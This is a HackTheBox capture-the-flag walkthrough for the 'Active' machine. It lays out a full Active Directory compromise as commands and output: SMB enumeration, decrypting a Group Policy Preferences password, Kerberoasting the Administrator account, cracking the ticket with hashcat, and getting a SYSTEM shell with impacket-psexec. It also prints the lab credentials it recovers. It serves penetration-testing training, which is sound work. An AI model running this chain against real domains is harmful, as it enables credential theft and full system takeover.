# Active | HackTheBox

### 1. Scan
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ sudo nmap -A -p- -T4 10.129.71.104
Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-23 02:29 EDT
Nmap scan report for 10.129.71.104
Host is up (0.30s latency).
Not shown: 65514 closed ports
PORT      STATE SERVICE       VERSION
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-05-23 06:50:48Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-
3269/tcp  open  tcpwrapped
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49169/tcp open  msrpc         Microsoft Windows RPC
49171/tcp open  msrpc         Microsoft Windows RPC
49177/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=5/23%OT=88%CT=1%CU=34695%PV=Y%DS=2%DC=T%G=Y%TM=60A9FBA
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=102%TI=I%CI=I%II=I%SS=S%TS=
OS:7)OPS(O1=M54DNW8ST11%O2=M54DNW8ST11%O3=M54DNW8NNT11%O4=M54DNW8ST11%O5=M5
OS:4DNW8ST11%O6=M54DST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=200
OS:0)ECN(R=Y%DF=Y%T=80%W=2000%O=M54DNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S
OS:+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%DF=Y%
OS:T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=
OS:0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%
OS:S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(
OS:R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=
OS:N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-05-23T06:52:03
|_  start_date: 2021-05-23T06:29:00

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   294.48 ms 10.10.14.1
2   294.59 ms 10.129.71.104

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1387.17 seconds
```
The machine is an Active Directory server running LDAP/SMB/Kerberos. Domain name is active.htb.

### 2. Enumerate
Ran enum4linux.
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ enum4linux-ng 10.129.71.104
ENUM4LINUX - next generation

...

 ===============================================
|    OS Information via RPC on 10.129.71.104    |
 ===============================================
[+] The following OS information were found:
server_type_string = Wk Sv PDC Tim NT     Domain Controller
platform_id        = 500
os_version         = 6.1
server_type        = 0x80102b
os                 = Windows 7, Windows Server 2008 R2

...

 =======================================
|    Shares via RPC on 10.129.71.104    |
 =======================================
[*] Enumerating shares
[+] Found 7 share(s):
ADMIN$:
  comment: Remote Admin
  type: Disk
C$:
  comment: Default share
  type: Disk
IPC$:
  comment: Remote IPC
  type: IPC
NETLOGON:
  comment: Logon server share
  type: Disk
Replication:
  comment: ''
  type: Disk
SYSVOL:
  comment: Logon server share
  type: Disk
Users:
  comment: ''
  type: Disk
[*] Testing share ADMIN$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share C$
[+] Mapping: DENIED, Listing: N/A
[*] Testing share IPC$
[+] Mapping: OK, Listing: DENIED
[*] Testing share NETLOGON
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Replication
[+] Mapping: OK, Listing: OK
[*] Testing share SYSVOL
[+] Mapping: DENIED, Listing: N/A
[*] Testing share Users
[+] Mapping: DENIED, Listing: N/A
```
Looking further into SMB, it appears only the Replication share contains things we can read.
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ smbmap -R -H 10.129.71.104 --depth 10                                                                       2 ⨯
[+] IP: 10.129.71.104:445       Name: 10.129.71.104                                     
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    NO ACCESS       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        Replication                                             READ ONLY
        .\Replication\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    active.htb
        .\Replication\active.htb\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    DfsrPrivate
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Policies
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    scripts
        .\Replication\active.htb\DfsrPrivate\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ConflictAndDeleted
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Deleted
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Installing
        .\Replication\active.htb\Policies\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    {31B2F340-016D-11D2-945F-00C04FB984F9}
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    {6AC1786C-016F-11D2-945F-00C04fB984F9}
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--               23 Sat Jul 21 06:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Group Policy
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    USER
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--              119 Sat Jul 21 06:38:11 2018    GPE.INI
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Microsoft
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Preferences
        fr--r--r--             2788 Sat Jul 21 06:38:11 2018    Registry.pol
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Windows NT
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    SecEdit
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--             1098 Sat Jul 21 06:38:11 2018    GptTmpl.inf
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Groups
        .\Replication\active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--              533 Sat Jul 21 06:38:11 2018    Groups.xml
        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--               22 Sat Jul 21 06:38:11 2018    GPT.INI
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    MACHINE
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    USER
        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Microsoft
        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    Windows NT
        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    SecEdit
        .\Replication\active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\*
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    .
        dr--r--r--                0 Sat Jul 21 06:37:44 2018    ..
        fr--r--r--             3722 Sat Jul 21 06:38:11 2018    GptTmpl.inf
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   NO ACCESS
```
The groups.xml file is of interest, as it can contain credentials on old Windows machines, as this one is.

### 2. Recover password
Retieve the file:
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ smbclient //10.129.71.104/Replication
Enter WORKGROUP\kali's password: 
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> get active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)
smb: \> exit
```
Open it, and see there is indeed an encyrpted password in there for SVC\TGS.
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ cat active.htb\\Policies\\\{31B2F340-016D-11D2-945F-00C04FB984F9\}\\MACHINE\\Preferences\\Groups\\Groups.xml 
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```
Now decrypt this password using gpp-decrypt.
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```
A set of creds has now been recovered: `SVC_TGS:GPPstillStandingStrong2k18`.

### 3. Enumerate with creds
Use CME to enumerate shares and see what is accessible now.
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ crackmapexec smb 10.129.71.104 -u 'SVC_TGS' -p GPPstillStandingStrong2k18 --shares
SMB         10.129.71.104   445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.71.104   445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.129.71.104   445    DC               [+] Enumerated shares
SMB         10.129.71.104   445    DC               Share           Permissions     Remark
SMB         10.129.71.104   445    DC               -----           -----------     ------
SMB         10.129.71.104   445    DC               ADMIN$                          Remote Admin
SMB         10.129.71.104   445    DC               C$                              Default share
SMB         10.129.71.104   445    DC               IPC$                            Remote IPC
SMB         10.129.71.104   445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.71.104   445    DC               Replication     READ            
SMB         10.129.71.104   445    DC               SYSVOL          READ            Logon server share 
SMB         10.129.71.104   445    DC               Users           READ
```
Login and read the users share, which provides access to the SVC_TGS user's files.
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ smbclient -U 'SVC_TGS' \\\\10.129.71.104\\Users\\                                                           1 ⨯
Enter WORKGROUP\SVC_TGS's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

                10459647 blocks of size 4096. 5203811 blocks available
smb: \> cd SVC_TGS
smb: \SVC_TGS\> ls
  .                                   D        0  Sat Jul 21 11:16:32 2018
  ..                                  D        0  Sat Jul 21 11:16:32 2018
  Contacts                            D        0  Sat Jul 21 11:14:11 2018
  Desktop                             D        0  Sat Jul 21 11:14:42 2018
  Downloads                           D        0  Sat Jul 21 11:14:23 2018
  Favorites                           D        0  Sat Jul 21 11:14:44 2018
  Links                               D        0  Sat Jul 21 11:14:57 2018
  My Documents                        D        0  Sat Jul 21 11:15:03 2018
  My Music                            D        0  Sat Jul 21 11:15:32 2018
  My Pictures                         D        0  Sat Jul 21 11:15:43 2018
  My Videos                           D        0  Sat Jul 21 11:15:53 2018
  Saved Games                         D        0  Sat Jul 21 11:16:12 2018
  Searches                            D        0  Sat Jul 21 11:16:24 2018
cd 
                10459647 blocks of size 4096. 5203811 blocks available
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> ls
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                            A       34  Sat Jul 21 11:06:25 2018
```

### 4. Request service ticket
Using this account, request any service tickets that can be cracked offline. The Administrator account's ticket is returned.
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.129.71.104 -request                                                                                              130 ⨯
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2021-01-22 03:42:30.615553             



$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$64c12b88a61b4191e7c7fd895b29eb83$286a58f41f9df172b8a62a0864d354eee8d09871ef843499b3a13cafa4e6938b69b81ae57faa22c033f23017f2d50ed7a31e2279fb7e5bfa6f367e226df06b0ec0f6dedd557fe9cf18306c416345c891e2b3f3d65846382d6954995531b9acfa36058c546e0751c86a80b2ec83c772e5d86ab724f00df8533ef0470f3c21b114ef6a27b79d138a6fa082e0cdd432cf510b513347d623a1aff144c5197bd422ff4936e155dd97113b458cbfd3d5abbb030be504e47cb99492445453931c324b6c19a229fb115b5dd274e852e443a028902a74b834859f59a17622b427fb1a5010d32bf9981bc4c261666daf8612e654713915a8c8aea3a42d84d72ba0ee631c00bb4c71917a3928a77a9bc73d7c3ba02f2ef65561db47cd409776cb37ced6c10c63600c163f99088d5904ac1dc68c099c8505200cf0b576b69a9cecd1142ca7e5616b6388fbb9ce6e2e5bfd787e5339c2d5245452a460530f0f02080c60eb6ce7d684e1505147d40c46545f6a114730e792deab4f26df11e8f798fd28f305de74246e9d0091e7da5ed7c6364bd5def97c2fc8aade5cd8ca7dd6184c0d3fe5c831e573d4ec3e621914f01f74c52e699b1e31eeae725c8e6875ebf8d5a6dee5cf538d4bc4368b11343f3c1d752c5954b43d5eba6a6934d9b5ce887f398a9578341bce030ce366308174d76b6207e7dd07469a7ac4ec68d2dbca00db4d6e80a2ad41d8577a6c1dc183f52dc5045f6c1e4257e7ad92a8597b67ff60cd1757e002ace25b89565ea1402e2a969b4ba9f6286a7c30f454aeec48a7d6eec4dfd96faa5464f15e18be317420cf0d161f659bba900da757511f9d2c2db4a2f2955a6f7675a3312edea1864940c11a0555114fb9600337b1310c1c2c983f8bc393441495b17ee0610391bf33427b727b15fe17b13b2a813fc69ddf567233a81ff2333e60c683c78670e9c0bbb1a404c698065ecd0d818beebed801c848c63c4d64921d9523a8f0236ec5760b7beff367e623330d5fd57a4a8458305547c5397e293ee7397f5c8c51b4acf5137cab7acead370ba91f178219a8e13c635b9001912e0c01646ee9b5a3c97a8cf7836f483d6aa6ec2188a9bac20e91a6a116b15b7c9b7319eeaf57db98821d40321131be28ec3e22f7250b6af4269593b673f25fafa3353fd46401f345f650bae667a1ed196ce07e2815658de448e37e7e9a8dc44dcc4b90ea41f717144554674a07c2ed709af7f40bc21fb5cb818d3708688cf461
```

### 5. Crack the hash
```bash
hashcat -a 0 -m 13100 admin.hash /usr/share/wordlists/rockyou.txt --quiet                                                                                                               139 ⨯
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$64c12b88a61b4191e7c7fd895b29eb83$286a58f41f9df172b8a62a0864d354eee8d09871ef843499b3a13cafa4e6938b69b81ae57faa22c033f23017f2d50ed7a31e2279fb7e5bfa6f367e226df06b0ec0f6dedd557fe9cf18306c416345c891e2b3f3d65846382d6954995531b9acfa36058c546e0751c86a80b2ec83c772e5d86ab724f00df8533ef0470f3c21b114ef6a27b79d138a6fa082e0cdd432cf510b513347d623a1aff144c5197bd422ff4936e155dd97113b458cbfd3d5abbb030be504e47cb99492445453931c324b6c19a229fb115b5dd274e852e443a028902a74b834859f59a17622b427fb1a5010d32bf9981bc4c261666daf8612e654713915a8c8aea3a42d84d72ba0ee631c00bb4c71917a3928a77a9bc73d7c3ba02f2ef65561db47cd409776cb37ced6c10c63600c163f99088d5904ac1dc68c099c8505200cf0b576b69a9cecd1142ca7e5616b6388fbb9ce6e2e5bfd787e5339c2d5245452a460530f0f02080c60eb6ce7d684e1505147d40c46545f6a114730e792deab4f26df11e8f798fd28f305de74246e9d0091e7da5ed7c6364bd5def97c2fc8aade5cd8ca7dd6184c0d3fe5c831e573d4ec3e621914f01f74c52e699b1e31eeae725c8e6875ebf8d5a6dee5cf538d4bc4368b11343f3c1d752c5954b43d5eba6a6934d9b5ce887f398a9578341bce030ce366308174d76b6207e7dd07469a7ac4ec68d2dbca00db4d6e80a2ad41d8577a6c1dc183f52dc5045f6c1e4257e7ad92a8597b67ff60cd1757e002ace25b89565ea1402e2a969b4ba9f6286a7c30f454aeec48a7d6eec4dfd96faa5464f15e18be317420cf0d161f659bba900da757511f9d2c2db4a2f2955a6f7675a3312edea1864940c11a0555114fb9600337b1310c1c2c983f8bc393441495b17ee0610391bf33427b727b15fe17b13b2a813fc69ddf567233a81ff2333e60c683c78670e9c0bbb1a404c698065ecd0d818beebed801c848c63c4d64921d9523a8f0236ec5760b7beff367e623330d5fd57a4a8458305547c5397e293ee7397f5c8c51b4acf5137cab7acead370ba91f178219a8e13c635b9001912e0c01646ee9b5a3c97a8cf7836f483d6aa6ec2188a9bac20e91a6a116b15b7c9b7319eeaf57db98821d40321131be28ec3e22f7250b6af4269593b673f25fafa3353fd46401f345f650bae667a1ed196ce07e2815658de448e37e7e9a8dc44dcc4b90ea41f717144554674a07c2ed709af7f40bc21fb5cb818d3708688cf461:Ticketmaster1968
```
The hash cracks, and the Administrator account password is shown to be Ticketmaster1968.

### 5. Get a shell as SYSTEM
As the Administrator account, the admin share is writable.
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ crackmapexec smb 10.129.71.104 -u Administrator -p Ticketmaster1968         
SMB         10.129.71.104   445    DC               [*] Windows 6.1 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.129.71.104   445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
```
Use psexec to go straight to system.
```bash
┌──(kali㉿kali)-[10.10.14.104]-[~/Desktop]
└─$ impacket-psexec Administrator:Ticketmaster1968@10.129.71.104
Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation

[*] Requesting shares on 10.129.71.104.....
[*] Found writable share ADMIN$
[*] Uploading file rgguRLey.exe
[*] Opening SVCManager on 10.129.71.104.....
[*] Creating service CEZe on 10.129.71.104.....
[*] Starting service CEZe.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```